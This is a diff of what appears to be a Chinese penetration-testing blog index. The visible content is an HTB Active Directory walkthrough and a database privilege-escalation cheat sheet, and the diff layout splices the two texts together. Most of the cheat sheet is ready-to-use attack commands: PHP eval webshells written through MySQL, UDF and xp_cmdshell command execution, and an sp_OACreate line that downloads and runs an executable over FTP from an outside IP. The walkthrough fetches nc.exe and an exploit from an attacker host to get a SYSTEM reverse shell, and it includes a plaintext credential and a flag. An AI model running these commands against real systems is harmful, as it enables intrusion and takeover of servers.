-（思考：这个bloodhound拓扑图该怎么看，都是什么东西，之间都有什么关系，怎么利用，攻击思路应该怎么找？？？）
+写入shell,可连蚁剑
+mysql&gt; select &quot;&lt;?php @eval($_POST[&#x27;suifeng&#x27;]);?&gt;&quot;;
 
 
-攻击路径：
-利用WEB_SVC→通过IT_SUPPORT组权限→重置MONITORING_SVC密码→接管MONITORING_SVC
+2、服务器权限UDF提权MYSQL UDF手动提权及自动化工具使用_udf提权工具-CSDN博客
+UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用一些系统函数如version()函数便捷。
+动态链接库及其导入利用前提：windows2003&#x2F;2000
+提权方法是把我们的动态链接库放置在特点的目录下，创建自定义函数，实现系统函数命令的调用，最终导致提权。
 
+在MySQL&lt;5.1 导出目录c:&#x2F;windows或system32
+在MySQL&gt;&#x3D;5.1 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;
 
-已经控制了 WEB_SVC
-WEB_SVC 属于 IT_SUPPORT 组
-IT_SUPPORT 组对 MONITORING_SVC 有 ForceChangePassword 权限
-所以不需要旧密码**，直接把 MONITORING_SVC 的密码改掉
-改完以后就接管了 MONITORING_SVC 账号**
+在有注入点时候，我们可以通过sqlmap中里的UDF动态链接库进行导入
+#sqlmap中动态链接库位置（本机）C:\SQLMAP\sqlmapproject-sqlmap-1e57a37\data\udf\mysql
 
-横向移动Kerberos 时间同步
-Kerberos 协议要求客户端与服务器 时间差不超过 5 分钟，以防止重放攻击
+里面有windows和Linux且64位和32位版本，根据被攻击器来进行选择
+查找安装目录
+mysql&gt; show variables like &#x27;%plugin%&#x27;;
 
-sudo ntpdate 10.129.243.199
+来到对应的目录下,自己创建一个&#x2F;lib&#x2F;plugin，创建好后我们就可以导入我们的动态链接库了。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。在~&#x2F;phpStudy&#x2F;MySQL&#x2F;lib&#x2F;目录下创建一个文件夹plugin，然后上传对应的udf.dll文件
 
-使用 web_svc 申请 TGT先用已知凭据向 KDC 申请 web_svc 的 Kerberos TGT
-impacket-getTGT nanocorp.htb/&#x27;web_svc&#x27;:&#x27;dksehdgh712!@#&#x27;
+文件上传完成后，就可以通过sql语句来自定义函数了
+#修改文件名后执行代码CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;
 
-这一步执行成功后，当前目录下会生成 web_svc.ccache（Kerberos 票据缓存文件）
-接着指定当前 shell 使用这张票据：
-export KRB5CCNAME=$(pwd)/web_svc.ccache
 
-KRB5CCNAME 表示当前要使用的 Kerberos 凭据缓存文件。 这里指定的是 web_svc.ccache，所以后续带 -k 的命令都会以 web_svc 的 Kerberos 身份 执行。
-可以先确认一下：
-klist //查看当前 Kerberos 票据缓存里的内容
+#创建成功后，我们利用自定义函数进行命令执行mysql &gt; select sys_eval(&#x27;whoami&#x27;);
 
-将 web_svc 加入 IT_SUPPORTbloodyAD -k --host dc01.nanocorp.htb -d nanocorp.htb add groupMember IT_SUPPORT web_svc
+具体导入操作
+UDF 提权辅助
+工具(sqlmap)利用sqlmap
+前提：得到数据库账号密码、且用户可外连
+python2 sqlmap.py -d &quot;mysql://root:root@192.168.142.130:3306/test&quot; --os-shell
 
-这一步的作用是把 web_svc 加入 IT_SUPPORT 组，从而获得后续对 MONITORING_SVC 的控制能力。
-重置 MONITORING_SVC 的密码在 web_svc 已经具备对应权限后，可以直接重置 MONITORING_SVC 的密码：
-bloodyAD -k --host dc01.nanocorp.htb -d nanocorp.htb set password MONITORING_SVC &#x27;Abc123456@&#x27;
+补充：mof,启动项：数据库—提权思路 - FreeBuf网络安全行业门户
+CVE-2016-6663、CVE-2016-6664组合提权MySQL小于5.5.51或小于5.6.32或小于5.7.14及衍生版本，可以利用CVE-2016-6663、CVE-2016-6664组合进行测试提权。
+1、利用CVE-2016-6663将www-data权限提升为mysql权限：
+cd /var/www/html/gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient./mysql-privesc-race test 123456 localhost testdb
 
-如果这一步成功，说明 MONITORING_SVC 的新密码已经被设置为 Abc123456@
-申请 MONITORING_SVC 的 Kerberos 票据为了避免仍然沿用 web_svc 的缓存，先清理当前环境变量：
-unset KRB5CCNAME
+2、利用CVE-2016-6664将MySQL权限提升为root权限：
+wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.shchmod 777 mysql-chowned.sh./mysql-chowned.sh /var/log/mysql/error.log
 
-然后以新密码为 MONITORING_SVC 申请 TGT：
-kinit MONITORING_SVC@NANOCORP.HTB
 
-输入刚刚设置的新密码：
-Abc123456@
+二、MSSQL提权—（1443）Tide安全团队——sql server提权总结 - 知乎
+mssql基本命令select @@version   #查看数据库版本select db_name()   #查看当前数据库select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)  #判断是否为sa权限select IS_MEMBER(&#x27;db_owner&#x27;)  #判断是否为dba权限exec master..xp_msver    #查看数据库系统参数#开启xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;#关闭xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure;#禁用advanced optionsEXEC sp_configure &#x27;show advanced options&#x27;,0;GO RECONFIGURE;#sp_OACreate执行命令DECLARE @js intEXEC sp_OACreate &#x27;ScriptControl&#x27;,@js OUTEXEC sp_OASetProperty @js,&#x27;Language&#x27;,&#x27;JavaScript&#x27;ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#x27;#sp_OACreate移动文件declare @aa intexec sp_oacreate &#x27;scripting.filesystemobject&#x27; @aa outexec sp_oamethod @aa, &#x27;moveFile&#x27;,null,&#x27;c:\temp\ipmi.log&#x27;,&#x27;c:\temp\ipmi1.log&#x27;;#sp_OACreate复制文件declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o outexec sp_oamethod @o,&#x27;copyfile&#x27;,null,&#x27;c:\windows\explorer.exe&#x27;,&#x27;c:\windows\system32\sethc.exe&#x27;;#sp_OACreate删除文件DECLARE @Result intDECLARE @FSO_Token intEXEC @Result = sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @FSO_Token OUTPUTEXEC @Result = sp_OAMethod @FSO_Token, &#x27;DeleteFile&#x27;,NULL,&#x27;c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat&#x27;EXEC @Result = sp_OADestrop @FSO_Token
 
-再确认当前票据是否已经切换为 MONITORING_SVC：
-klist
+mssql权限管理bulkadmin:这个角色可以运行BULK INSERT语句.该语句允许从文本文件中将数据导入到SQL Server2008数据库中,为需要执行大容量插入到数据库的域帐号而设计.dbcreator:这个角色可以创建,更改,删除和还原任何数据库.不仅适合助理DBA角色,也可能适合开发人员角色.diskadmin:这个角色用于管理磁盘文件,比如镜像数据库和添加备份设备.适合助理DBAprocessadmin:SQL Server 2008可以同时多进程处理.这个角色可以结束进程(在SQL Server 2008中称为&quot;删除&quot;)public:有两大特点:第一,初始状态时没有权限;第二,所有数据库用户都是它的成员securityadmin:这个角色将管理登录名及其属性.可以授权,拒绝和撤销服务器级/数据库级权限.可以重置登录名和密码serveradmin:这个角色可以更改服务器范围的配置选项和关闭服务器setupadmin:为需要管理联接服务器和控制启动的存储过程的用户而设计.sysadmin:这个角色有权在SQL Server 2008 中执行任何操作.
 
-如果成功，应该能看到类似：
-Default principal: MONITORING_SVC@NANOCORP.HTB
+xp_cmdshel提权xp_cmdshell的作用类似于mysql的udf，其本质是一些sql语句的集合，xp_cmdshell也可以理解为一些危险性比较高的小脚本。
+xp_cmdshell在mssql2000中开启，在2005之后就是默认禁止的，我们需要sa权限来开启xp_cmdshell
 
-使用 WinRM 登录先把 MONITORING_SVC 的票据显式指定出来：
-export KRB5CCNAME=FILE:/home/echoin/桌面/MONITORING_SVC.ccache
+#开启xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;#执行命令EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;#关闭开启xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure
 
-然后使用evil-winrm连接 WinRM：
-evil-winrm -i dc01.nanocorp.htb -r NANOCORP.HTB -S
+sp_OACreate提权当xp_cmdshell不可用的时候，我们还可以利用sc_oacreate来进行提权
+#开启sc_oacreateEXEC sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE WITH OVERRIDE;  EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE WITH OVERRIDE;  EXEC sp_configure &#x27;show advanced options&#x27;, 0;#直接传马DECLARE @shell INT EXEC SP_OAcreate &#x27;wscript.shell&#x27;,@shell OUTPUT EXEC SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;%systemroot%\system32\cmd.exe /c echo open 222.180.210.113 &gt; cmd.txt&amp;echo 123&gt;&gt; cmd.txt&amp;echo123&gt;&gt; cmd.txt&amp;echo binary &gt;&gt; cmd.txt&amp;echo get 1.exe &gt;&gt; cmd.txt&amp;echo bye &gt;&gt; cmd.txt&amp;ftp -s:cmd.txt&amp;1.exe&amp;1.exe&amp;del cmd.txt. /q /f&amp;del 1.exe /f /q&#x27;--
 
-注意：
+沙盒提权沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.
+利用条件：
+1，Access可以调用VBS(VBScript)的函数，以System权限执行任意命令
+2，Access执行这个命令是有条件的，需要一个开关被打开
+3，这个开关在注册表里
+4，SA是有权限写注册表的
+5，用SA写注册表的权限打开那个开关
+6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令
+开启默认关闭的xp_regwrite存储过程：
+EXEC master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SoftWare\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0
 
-这里使用WinRM，是因为目标主机开了 WinRM，且是 5986
-nmap里最关键的是这行：
-5986/tcp open  ssl/http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+利用jet.oledb执行系统命令添加系统账号：
+select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;,&#x27;select shell(&quot;whoami&quot;)&#x27;)
 
-这基本就说明：
-
-5986 端口开放
-跑的是 HTTP over SSL&#x2F;TLS
-这是 WinRM over HTTPS 的典型端口
-
-
-拿flag1 
-
-
-9268b3fdea83629fae1a28d5a25b56d1
-
-提权用户与组信息收集：
-本地用户：net user（列出本地用户）；net user 用户名（查看指定用户详情，含描述可能泄露密码）。本地管理员组：net localgroup administrators（找高权限用户）。域用户（需域内权限）：net user &#x2F;domain（列出所有域用户）；net user 用户名 &#x2F;domain（域用户详情）。域管理员组：net group “Domain Admins” &#x2F;domain（核心目标，获取域管列表）。
-
-
-现在所在用户：monitoring_svc
-
-所在域：nanocorp
-
-用户权限：user
-
-域管理员：Administrator
-
-域用户：Administrator，Guest，krbtgt，monitoring_svc，web_svc
-
-Administrator：域高权限账号
-
-krbtgt：Kerberos 关键账户
-
-monitoring_svc：当前已经拿到 shell 的账号
-
-web_svc：前面利用链里拿到的服务账号
-
-
-
-查找系统漏洞：
-systeminfo
-
-但是当前这个 WinRM 会话里的 monitoring_svc 没有权限执行 systeminfo.exe，或者该程序被策略拦了
-
-
-看一下靶机上运行着什么服务，找漏洞：
-查看进程Get-Process
-
-
-新发现：
-
-check_mk_agent - Check MK监控代理
-cmk-agent-ctl- Check MK代理控制服务
-
-CVE-2024-0670在2.2.0p23、2.1.0p40和2.0.0（EOL）之前，Checkmk中Windows代理插件的权限升级允许本地用户升级权限
-poc:elsevar11&#x2F;CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit：本仓库包含针对 CVE-2024-0670 的漏洞演示，该漏洞是影响 Windows 版 CheckMK Agent 的本地权限提升漏洞。该漏洞允许低权限用户通过滥用MSI修复机制处理的可写文件路径来获得SYSTEM权限。
-在目标上下载工具
-Invoke-WebRequest -Uri &quot;http://10.10.17.177:8000/RunasCs.exe&quot; -OutFile &quot;C:\Windows\Temp\RunasCs.exe&quot;Invoke-WebRequest -Uri &quot;http://10.10.17.177:8000/nc.exe&quot; -OutFile &quot;C:\Windows\Temp\nc.exe&quot;Invoke-WebRequest -Uri &quot;http://10.10.17.177:8000/exploit.ps1&quot; -OutFile &quot;C:\Windows\Temp\exploit.ps1
-
-监听：
-nc -lvnp 1111
-
-运行
-.\RunasCs.exe username &quot;password&quot; &quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1&quot;
-
-获得 SYSTEM 反向 shell
+三、Oracle提权(1521)- 
 ]]></content>
       <categories>
-        <category>靶场</category>
+        <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>HTB</tag>
-        <tag>靶场</tag>
-        <tag>NanoCorp</tag>
+        <tag>提权</tag>
+        <tag>MySQL</tag>
+        <tag>UDF</tag>
       </tags>
   </entry>
   <entry>
@@ -6098,193 +6285,6 @@ https://xz.aliyun.com/news/11769https://xz.aliyun.com/news/19148https://www.cnbl
       </tags>
   </entry>
   <entry>
-    <title>MySQL 数据库提权（webshell + UDF）</title>
-    <url>/2026/08/24/mysql-udf-privesc/</url>
-    <content><![CDATA[权限提升：操作系统数据库姿势总结 - FreeBuf网络安全行业门户
-【权限提升】六种数据库提权&amp;口令获取-阿里云开发者社区
-数据库提权总结 - 随风kali - 博客园
-提权总结以及各种利用姿势
-提权的方法总结一、系统漏洞提权
-
-获取操作系统类型以及版本号
-根据获取的系统版本号在互联网搜索exp
-尝试利用exp获取权限
-尝试反弹shell
-
-二、数据库提权
-
-MySQL数据库——udf提权
-数据库提权——mof提权
-数据库提权——反弹端口提权
-数据库提权——启动项提权
-
-三、第三方软件&#x2F;服务提权
-
-通过第三方软件漏洞进行提权
-通过服务端口、服务协议漏洞进行提权
-
-数据库权限MySQL 3306 端口弱口令爆破sqlmap 注入的 --sql-shell 模式网站的数据库配置文件中拿到明文密码信息CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限
-
-CVE-2012-2122复现：采用shell脚本：（直接返回MySQL的shell）
-for i in `seq 1 1000`; do mysql -u root --password=bad -h 192.168.186.128 2&gt;/dev/null; done
-
-
-注意该方法只适用于较低版本：
-
-其他方法：https://blog.csdn.net/weixin_43606134/article/details/107928916#:~:text=%E7%9A%84%E7%AB%AF%E5%8F%A3-,%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4,-%E6%88%91%E4%BB%AC%E7%94%A8nmap
-
-常用MySQL数据库查询语句整理：1）库与会话基础
--- 查看当前连接信息SELECT USER(), CURRENT_USER(), DATABASE(), VERSION();-- 查看当前时间SELECT NOW(), CURDATE(), CURTIME();-- 查看所有数据库 / 选择数据库SHOW DATABASES;USE db_name;-- 查看当前库SELECT DATABASE();
-
-2）表与结构（SHOW &#x2F; DESCRIBE）
--- 当前库所有表SHOW TABLES;-- 查看建表语句（最有用）SHOW CREATE TABLE table_name;-- 查看字段结构DESCRIBE table_name;SHOW COLUMNS FROM table_name;-- 查看表状态SHOW TABLE STATUS LIKE &#x27;table_name&#x27;;-- 查看索引SHOW INDEX FROM table_name;-- 查看视图SHOW FULL TABLES WHERE Table_type = &#x27;VIEW&#x27;;SHOW CREATE VIEW view_name;
-
-3）information_schema 结构化查询（查库&#x2F;表&#x2F;字段&#x2F;键&#x2F;索引）
--- 所有数据库SELECT schema_name FROM information_schema.schemata;-- 某库所有表SELECT table_nameFROM information_schema.tablesWHERE table_schema = &#x27;db_name&#x27;;-- 某表所有字段（含类型/是否可空/默认值）SELECT column_name, column_type, is_nullable, column_defaultFROM information_schema.columnsWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;ORDER BY ordinal_position;-- 主键/唯一键/普通索引（键约束层）SELECT constraint_name, constraint_typeFROM information_schema.table_constraintsWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;;-- 具体哪些列属于某个键（如 PRIMARY）SELECT constraint_name, column_nameFROM information_schema.key_column_usageWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;ORDER BY ordinal_position;-- 索引明细（更细）SELECT index_name, seq_in_index, column_name, non_uniqueFROM information_schema.statisticsWHERE table_schema=&#x27;db_name&#x27; AND table_name=&#x27;table_name&#x27;ORDER BY index_name, seq_in_index;
-
-4）SELECT 基础（字段、别名、去重）
--- 查所有列/部分列SELECT * FROM table_name;SELECT col1, col2 AS alias2 FROM table_name;-- 去重SELECT DISTINCT col1 FROM table_name;-- 常用：限制返回行数SELECT * FROM table_name LIMIT 10;
-
-一、MySQL提权（3306）数据库提权总结 - 随风kali - 博客园
-❗（注意MySQL和Windows的版本是否能漏洞利用）
-打开MySQL： cmd
-mysql -uroot -p
-
-1、Webshell权限into oufile 写 shell（into oufile ：把 SELECT 查询结果 由 MySQL 服务器端 写入到一个文件里）
-into oufile 写 shell要满足如下条件才可以写入
-1、知道网站物理路径2、高权限数据库用户3、load_file() 开启 即 secure_file_priv 无限制4、网站路径有写入权限
-
- 数据库查看是否有secure_file_priv 限制
-mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;+------------------+-------+| Variable_name    | Value |+------------------+-------+| secure_file_priv | NULL  |+------------------+-------+
-
-
-
-
-Value
-说明
-
-
-
-NULL
-不允许导入或导出
-
-
-&#x2F;
-只允许在 &#x2F; 目录导入导出
-
-
-空
-不限制目录
-
-
-
-在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
-在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
-
-①利用phpMyAdmin来into out file在phpMyAdmin中，我们可以利用log变量来猜测网站的绝对路径
-
-这里是用phpstudy搭建的网站，所以猜测网站目录在WWW目录下，或者通过其他手段的信息收集，来收集到我们的网站绝对路径。
-有了网站路径，我们就可以执行SQL命令来进行写shell
-（注意：这里也要求没有secure_file_priv 限制，打开my.ini文件，加入secure_file_priv=&#39;&#39;语句再重启服务器）
-(本机的MySQL版本是5.7.26，my.ini文件已加入secure_file_priv=&#39;&#39;语句)
-select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;D:/phpstudy_pro/www/shell.php&#x27;
-
-
-蚁剑连：
-
-
-②利用sqlmap来into out file如下（同样要求没有secure_file_priv 限制）：
-sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;C:/Users/suifeng/Desktop/shell.php&quot; --file-dest=&quot;C:/phpstudy_pro/WWW/shell.php&quot;
-
-利用日志写shell在MySQL 5.0 版本以上会创建日志文件，我们可以通过修改日志的全局变量中的存储位置来 getshell
-语句：
-mysql&gt;SHOW VARIABLES LIKE &#x27;%general%&#x27;;
-
-general_log 默认关闭，高权限的用户可以直接通过mysql命令行进行开启，开启后日志文件记录用户的每条指令，将其保存在general_log _file中。我们可以通过开启general_log ，然后自定义general_log _file来进行getshell。
-mysql&gt; set global general_log = &quot;ON&quot;;   #开启general_logmysql&gt; set global general_log_file=&#x27;c:/phpstudy_pro/www/shell.php&#x27;; #修改general_log_file路径
-
-
-写入shell,可连蚁剑
-mysql&gt; select &quot;&lt;?php @eval($_POST[&#x27;suifeng&#x27;]);?&gt;&quot;;
-
-
-2、服务器权限UDF提权MYSQL UDF手动提权及自动化工具使用_udf提权工具-CSDN博客
-UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用一些系统函数如version()函数便捷。
-动态链接库及其导入利用前提：windows2003&#x2F;2000
-提权方法是把我们的动态链接库放置在特点的目录下，创建自定义函数，实现系统函数命令的调用，最终导致提权。
-
-在MySQL&lt;5.1 导出目录c:&#x2F;windows或system32
-在MySQL&gt;&#x3D;5.1 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;
-
-在有注入点时候，我们可以通过sqlmap中里的UDF动态链接库进行导入
-#sqlmap中动态链接库位置（本机）C:\SQLMAP\sqlmapproject-sqlmap-1e57a37\data\udf\mysql
-
-里面有windows和Linux且64位和32位版本，根据被攻击器来进行选择
-查找安装目录
-mysql&gt; show variables like &#x27;%plugin%&#x27;;
-
-来到对应的目录下,自己创建一个&#x2F;lib&#x2F;plugin，创建好后我们就可以导入我们的动态链接库了。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。在~&#x2F;phpStudy&#x2F;MySQL&#x2F;lib&#x2F;目录下创建一个文件夹plugin，然后上传对应的udf.dll文件
-
-文件上传完成后，就可以通过sql语句来自定义函数了
-#修改文件名后执行代码CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;
-
-
-#创建成功后，我们利用自定义函数进行命令执行mysql &gt; select sys_eval(&#x27;whoami&#x27;);
-
-具体导入操作
-UDF 提权辅助
-工具(sqlmap)利用sqlmap
-前提：得到数据库账号密码、且用户可外连
-python2 sqlmap.py -d &quot;mysql://root:root@192.168.142.130:3306/test&quot; --os-shell
-
-补充：mof,启动项：数据库—提权思路 - FreeBuf网络安全行业门户
-CVE-2016-6663、CVE-2016-6664组合提权MySQL小于5.5.51或小于5.6.32或小于5.7.14及衍生版本，可以利用CVE-2016-6663、CVE-2016-6664组合进行测试提权。
-1、利用CVE-2016-6663将www-data权限提升为mysql权限：
-cd /var/www/html/gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient./mysql-privesc-race test 123456 localhost testdb
-
-2、利用CVE-2016-6664将MySQL权限提升为root权限：
-wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.shchmod 777 mysql-chowned.sh./mysql-chowned.sh /var/log/mysql/error.log
-
-
-二、MSSQL提权—（1443）Tide安全团队——sql server提权总结 - 知乎
-mssql基本命令select @@version   #查看数据库版本select db_name()   #查看当前数据库select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)  #判断是否为sa权限select IS_MEMBER(&#x27;db_owner&#x27;)  #判断是否为dba权限exec master..xp_msver    #查看数据库系统参数#开启xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;#关闭xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure;#禁用advanced optionsEXEC sp_configure &#x27;show advanced options&#x27;,0;GO RECONFIGURE;#sp_OACreate执行命令DECLARE @js intEXEC sp_OACreate &#x27;ScriptControl&#x27;,@js OUTEXEC sp_OASetProperty @js,&#x27;Language&#x27;,&#x27;JavaScript&#x27;ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#x27;#sp_OACreate移动文件declare @aa intexec sp_oacreate &#x27;scripting.filesystemobject&#x27; @aa outexec sp_oamethod @aa, &#x27;moveFile&#x27;,null,&#x27;c:\temp\ipmi.log&#x27;,&#x27;c:\temp\ipmi1.log&#x27;;#sp_OACreate复制文件declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o outexec sp_oamethod @o,&#x27;copyfile&#x27;,null,&#x27;c:\windows\explorer.exe&#x27;,&#x27;c:\windows\system32\sethc.exe&#x27;;#sp_OACreate删除文件DECLARE @Result intDECLARE @FSO_Token intEXEC @Result = sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @FSO_Token OUTPUTEXEC @Result = sp_OAMethod @FSO_Token, &#x27;DeleteFile&#x27;,NULL,&#x27;c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat&#x27;EXEC @Result = sp_OADestrop @FSO_Token
-
-mssql权限管理bulkadmin:这个角色可以运行BULK INSERT语句.该语句允许从文本文件中将数据导入到SQL Server2008数据库中,为需要执行大容量插入到数据库的域帐号而设计.dbcreator:这个角色可以创建,更改,删除和还原任何数据库.不仅适合助理DBA角色,也可能适合开发人员角色.diskadmin:这个角色用于管理磁盘文件,比如镜像数据库和添加备份设备.适合助理DBAprocessadmin:SQL Server 2008可以同时多进程处理.这个角色可以结束进程(在SQL Server 2008中称为&quot;删除&quot;)public:有两大特点:第一,初始状态时没有权限;第二,所有数据库用户都是它的成员securityadmin:这个角色将管理登录名及其属性.可以授权,拒绝和撤销服务器级/数据库级权限.可以重置登录名和密码serveradmin:这个角色可以更改服务器范围的配置选项和关闭服务器setupadmin:为需要管理联接服务器和控制启动的存储过程的用户而设计.sysadmin:这个角色有权在SQL Server 2008 中执行任何操作.
-
-xp_cmdshel提权xp_cmdshell的作用类似于mysql的udf，其本质是一些sql语句的集合，xp_cmdshell也可以理解为一些危险性比较高的小脚本。
-xp_cmdshell在mssql2000中开启，在2005之后就是默认禁止的，我们需要sa权限来开启xp_cmdshell
-
-#开启xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;#执行命令EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;#关闭开启xp_cmdshellexec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure
-
-sp_OACreate提权当xp_cmdshell不可用的时候，我们还可以利用sc_oacreate来进行提权
-#开启sc_oacreateEXEC sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE WITH OVERRIDE;  EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE WITH OVERRIDE;  EXEC sp_configure &#x27;show advanced options&#x27;, 0;#直接传马DECLARE @shell INT EXEC SP_OAcreate &#x27;wscript.shell&#x27;,@shell OUTPUT EXEC SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;%systemroot%\system32\cmd.exe /c echo open 222.180.210.113 &gt; cmd.txt&amp;echo 123&gt;&gt; cmd.txt&amp;echo123&gt;&gt; cmd.txt&amp;echo binary &gt;&gt; cmd.txt&amp;echo get 1.exe &gt;&gt; cmd.txt&amp;echo bye &gt;&gt; cmd.txt&amp;ftp -s:cmd.txt&amp;1.exe&amp;1.exe&amp;del cmd.txt. /q /f&amp;del 1.exe /f /q&#x27;--
-
-沙盒提权沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.
-利用条件：
-1，Access可以调用VBS(VBScript)的函数，以System权限执行任意命令
-2，Access执行这个命令是有条件的，需要一个开关被打开
-3，这个开关在注册表里
-4，SA是有权限写注册表的
-5，用SA写注册表的权限打开那个开关
-6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令
-开启默认关闭的xp_regwrite存储过程：
-EXEC master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SoftWare\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0
-
-利用jet.oledb执行系统命令添加系统账号：
-select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;,&#x27;select shell(&quot;whoami&quot;)&#x27;)
-
-三、Oracle提权(1521)- 
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>提权</tag>
-        <tag>MySQL</tag>
-        <tag>UDF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NoSQL + MongoDB + SQLite</title>
     <url>/2026/08/24/nosql-mongodb-sqlite/</url>
     <content><![CDATA[Nosql 注入从零到一-先知社区
@@ -6559,251 +6559,6 @@ password[]=2（数组 [2]）
       <tags>
         <tag>CTF</tag>
         <tag>NSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>phar 反序列化</title>
-    <url>/2026/08/24/phar-deserialization/</url>
-    <content><![CDATA[PHP Phar反序列化总结_ctf phpphar反序列化-CSDN博客
-利用 phar 拓展 php 反序列化漏洞攻击面
-浅析Phar反序列化 - FreeBuf网络安全行业门户
-php(phar)反序列化漏洞及各种绕过姿势_throw new 绕过php-CSDN博客
-Phar反序列化Phar文件结构phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分。
-[Stub] + [Manifest] + [File Contents] + [Signature]
-
-1.a stub    可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件**(注意绕过)**2.a manifest describing the contents
-
-Manifest 是 Phar 文件格式中的一个核心部分，它相当于 Phar 文件的”目录”或”元数据索引”。
-
